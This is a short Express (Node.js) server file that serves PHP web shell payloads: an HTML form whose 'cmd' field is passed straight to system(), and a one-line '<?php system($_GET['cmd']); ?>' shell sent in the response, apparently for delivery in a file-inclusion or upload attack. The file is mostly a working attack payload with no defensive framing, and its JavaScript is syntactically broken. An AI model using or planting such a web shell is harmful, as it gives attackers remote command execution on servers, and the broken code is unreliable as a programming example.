const express = require('express')
const app = express()
app.all('/', (req, res) => {
    console.log("Just got a request!")
    data=<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
    res.send('<?php system($_GET['cmd']); ?>')
})
app.listen(process.env.PORT || 3000)
